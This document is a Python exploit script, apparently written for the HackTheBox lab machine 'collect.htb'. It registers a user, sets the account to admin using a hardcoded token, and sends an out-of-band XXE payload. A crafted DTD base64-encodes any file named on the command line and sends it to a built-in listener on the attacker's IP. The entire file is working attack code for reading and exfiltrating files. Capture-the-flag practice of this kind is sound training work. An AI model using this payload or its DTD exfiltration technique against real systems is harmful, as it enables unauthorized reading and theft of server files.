#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-02
Description:

Usage: python script.py [FILENAME]
                        - Where FILENAME is the full path of the file from CWD

Example: python script.py '/etc/hostname'
"""

import threading
import http.server
from base64 import b64decode
import re
import requests
import string
import netifaces as ni
import os
import sys
import random
import pickle

# Get HackTheBox vpn ip from tun0 interface
try:
    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}
host = "http://collect.htb"
rnd_word = ''.join(random.choices(string.ascii_letters, k=10))


# Custom handler for http server for handling received requests
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # If the request has a "data" parameter
        if "file" in self.path:
            recv_data = re.findall(r"/\?file=(.*?)$", self.path)[0]
            base64_decoded = b64decode(recv_data).decode('UTF-8')
            print(f"[+] Data received -\n\n{base64_decoded}", end='')

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    # Suppress logging of HTTP requests
    def log_message(self, format, *args):
        pass


def start_server():
    server_address = ("", 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    print("[+] Server started on port 8000")
    httpd.serve_forever()


def init_dtd(ip, filename):
    with open("exfiltrate.dtd", 'w') as f:
        dtd = f"""<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource={filename}'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{ip}:8000/?file=%file;'>">
%eval;
%exfiltrate;
"""
        f.write(dtd)


def init_session(url, username, password):
    global session

    session_file = 'session.pickle'
    if os.path.exists(session_file):
        with open(session_file, 'rb') as f:
            session = pickle.load(f)
            return True
    else:
        print("[!] session not found, Creating new session")
        print(f"[+] Creating user with: {username}:{password}")

        account_info = {"username": username, "password": password}
        register = session.post(f"{url}/register", data=account_info)
        login = session.post(f"{url}/login", data=account_info)

        admin_token = {"token": "ddac62a28254561001277727cb397baf"}
        set_admin = session.post(f"{url}/set/role/admin", data=admin_token, allow_redirects=False)

        if set_admin.headers["Location"] == "/admin":
            with open(session_file, 'wb') as f:
                pickle.dump(session, f)
            return True
        else:
            return False


def send_payload(url, ip):
    payload = '<?xml version="1.0" encoding="UTF-8"?>' \
              f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{ip}:8000/exfiltrate.dtd"> %xxe;]>' \
              '<root><method>POST</method><uri>/auth/register</uri><user><username>test</username><password>test</password></user></root>'
    xxe_data = {"manage_api": payload}
    session.post(f"{url}/api", data=xxe_data)


if __name__ == "__main__":
    try:
        init_dtd(ip=tun0_ip, filename=sys.argv[1])
    except IndexError as e:
        exit("Usage: script.py <filename>")

    # Create the event object and start the server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    is_session = init_session(url=host, username=rnd_word, password=rnd_word)
    if is_session:
        send_payload(url=host, ip=tun0_ip)
    else:
        exit("[-] Unknown session!")
